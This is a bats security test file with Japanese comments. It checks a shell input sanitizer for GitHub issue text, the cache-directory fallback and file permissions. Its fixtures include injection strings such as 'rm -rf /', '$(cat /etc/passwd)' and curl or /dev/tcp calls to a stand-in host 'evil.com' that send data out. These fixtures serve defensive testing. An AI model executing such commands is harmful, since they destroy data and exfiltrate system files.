#!/usr/bin/env bats
# test_security.bats - セキュリティ対策のテスト
#
# Issue #180: コマンドインジェクション対策、トークンキャッシュ改善、
# ファイルパーミッション修正の検証

load test_helper

setup() {
    setup_temp_dir
    export WORKSPACE_DIR="$TEST_TEMP_DIR/workspace"
    export IGNITE_RUNTIME_DIR="$WORKSPACE_DIR"
    mkdir -p "$IGNITE_RUNTIME_DIR/state"
    mkdir -p "$IGNITE_RUNTIME_DIR/queue/leader"

    # ログ関数スタブ
    log_info() { :; }
    log_error() { echo "ERROR: $*" >&2; }
    log_warn() { :; }
    export -f log_info log_error log_warn
}

teardown() {
    cleanup_temp_dir
}

# =============================================================================
# 1. _sanitize_external_input テスト（github_watcher.sh）
# =============================================================================

# github_watcher.sh から _sanitize_external_input のみ抽出
_load_sanitize_function() {
    eval "$(sed -n '/_sanitize_external_input()/,/^}/p' "$SCRIPTS_DIR/utils/github_watcher.sh")"
}

@test "sanitize: シェルメタ文字が全角に変換される" {
    _load_sanitize_function

    local result
    result=$(_sanitize_external_input 'hello; rm -rf / & echo $(whoami) | cat `id`')

    # セミコロン、アンパサンド、ドル記号、パイプ、バッククォートが全角に変換
    [[ "$result" != *';'* ]]
    [[ "$result" != *'&'* ]]
    [[ "$result" != *'$'* ]]
    [[ "$result" != *'|'* ]]
    [[ "$result" != *'`'* ]]
    # 全角文字に変換されていることを確認
    [[ "$result" == *'；'* ]]
    [[ "$result" == *'＆'* ]]
    [[ "$result" == *'＄'* ]]
    [[ "$result" == *'｜'* ]]
    [[ "$result" == *'｀'* ]]
}

@test "sanitize: 制御文字（NULL, タブ以外）が除去される" {
    _load_sanitize_function

    # ヌルバイト + ベルコード + バックスペースを含む入力
    local input
    input=$(printf 'hello\x00world\x07test\x08end')
    local result
    result=$(_sanitize_external_input "$input")

    [[ "$result" == "helloworldtestend" ]]
}

@test "sanitize: 長さ制限が適用される" {
    _load_sanitize_function

    local long_input
    long_input=$(python3 -c "print('A' * 500)")
    local result
    result=$(_sanitize_external_input "$long_input" 100)

    [[ ${#result} -le 100 ]]
}

@test "sanitize: 改行・タブが除去される（YAMLインジェクション防止）" {
    _load_sanitize_function

    local input
    input=$(printf 'first_line\nsecond: injected\tthird')
    local result
    result=$(_sanitize_external_input "$input")

    # 改行・タブが除去されて1行になること
    [[ "$result" != *$'\n'* ]]
    [[ "$result" != *$'\t'* ]]
    [[ "$result" == "first_linesecond: injectedthird" ]]
}

@test "sanitize: HTMLインジェクション文字が全角に変換される" {
    _load_sanitize_function

    local result
    result=$(_sanitize_external_input '<script>alert(1)</script>')

    [[ "$result" != *'<'* ]]
    [[ "$result" != *'>'* ]]
    [[ "$result" == *'＜'* ]]
    [[ "$result" == *'＞'* ]]
}

@test "sanitize: サブシェル実行パターンが無害化される" {
    _load_sanitize_function

    local result
    result=$(_sanitize_external_input '$(cat /etc/passwd)')

    [[ "$result" != *'$('* ]]
    [[ "$result" == *'＄（'* ]]
}

# =============================================================================
# 2. _get_cache_dir /tmp fallback 排除テスト（github_helpers.sh）
# =============================================================================

@test "cache_dir: WORKSPACE_DIR設定時にstate/を返す" {
    eval "$(sed -n '/_get_cache_dir()/,/^}/p' "$SCRIPTS_DIR/utils/github_helpers.sh")"

    export WORKSPACE_DIR="$TEST_TEMP_DIR/workspace"
    local result
    result=$(_get_cache_dir)

    [[ "$result" == "$TEST_TEMP_DIR/workspace/state" ]]
}

@test "cache_dir: 環境変数未設定時に/tmpフォールバックせずエラーを返す" {
    eval "$(sed -n '/_get_cache_dir()/,/^}/p' "$SCRIPTS_DIR/utils/github_helpers.sh")"

    unset WORKSPACE_DIR
    unset IGNITE_WORKSPACE_DIR

    run _get_cache_dir

    [[ "$status" -ne 0 ]]
    [[ "$output" != */tmp* ]]
}

# =============================================================================
# 3. TOCTOU修正テスト（github_helpers.sh トークンキャッシュ書き込み）
# =============================================================================

@test "token_cache: キャッシュファイルが600パーミッションで作成される" {
    local test_cache_dir="$TEST_TEMP_DIR/workspace/state"
    mkdir -p "$test_cache_dir"
    local test_file="$test_cache_dir/.bot_token_test"

    # umask 077 でファイル作成（github_helpers.sh と同じパターン）
    ( umask 077; echo "ghs_testtoken123" > "$test_file" )

    local perms
    perms=$(stat -c "%a" "$test_file" 2>/dev/null || stat -f "%Lp" "$test_file" 2>/dev/null)

    [[ "$perms" == "600" ]]
}

# =============================================================================
# 4. MIME ファイルパーミッションテスト（ignite_mime.py）
# =============================================================================

@test "mime: 出力ファイルが600パーミッションで作成される" {
    local output_file="$TEST_TEMP_DIR/test_message.mime"

    python3 "$SCRIPTS_DIR/lib/ignite_mime.py" build \
        --from test --to leader --type test_event \
        --body "test: true" -o "$output_file"

    [[ -f "$output_file" ]]

    local perms
    perms=$(stat -c "%a" "$output_file" 2>/dev/null || stat -f "%Lp" "$output_file" 2>/dev/null)

    [[ "$perms" == "600" ]]
}

# =============================================================================
# 5. 攻撃パターンテスト（統合）
# =============================================================================

@test "attack: コマンドインジェクション付きIssueタイトルが無害化される" {
    _load_sanitize_function

    # 典型的なコマンドインジェクション攻撃パターン
    local malicious_title='Fix bug"; curl http://evil.com/steal?data=$(cat /etc/passwd) #'
    local result
    result=$(_sanitize_external_input "$malicious_title" 256)

    # コマンド実行ベクターが全て無害化されていること
    [[ "$result" != *'$('* ]]
    [[ "$result" != *'`'* ]]
    [[ "$result" != *';'* ]]
    # 全角に変換されていることを確認
    [[ "$result" == *'＄'* ]]
    [[ "$result" == *'；'* ]]
    # 元のテキスト部分は残っていること
    [[ "$result" == *'Fix bug'* ]]
}

@test "attack: YAMLインジェクション付きIssue本文が無害化される" {
    _load_sanitize_function

    # YAMLアンカー/エイリアス攻撃
    local malicious_body='description: |
  normal text
priority: critical
secret: &anchor
  token: stolen_value
<<: *anchor'

    local result
    result=$(_sanitize_external_input "$malicious_body" 10000)

    # 長さ制限内で切られていること
    [[ ${#result} -le 10000 ]]
    # シェル危険文字が全角に変換されていること
    [[ "$result" != *'&'* ]]
    [[ "$result" == *'＆'* ]]
    # 改行が除去されていること（YAMLインジェクション防止）
    [[ "$result" != *$'\n'* ]]
}

@test "attack: 複合攻撃パターン（バッククォート+パイプ+リダイレクト）がブロックされる" {
    _load_sanitize_function

    local malicious='`curl evil.com` | tee /tmp/stolen > /dev/tcp/evil/80'
    local result
    result=$(_sanitize_external_input "$malicious" 256)

    # バッククォート、パイプ、リダイレクトが全角に変換
    [[ "$result" != *'`'* ]]
    [[ "$result" != *'|'* ]]
    [[ "$result" != *'>'* ]]
    [[ "$result" == *'｀'* ]]
    [[ "$result" == *'｜'* ]]
    [[ "$result" == *'＞'* ]]
}
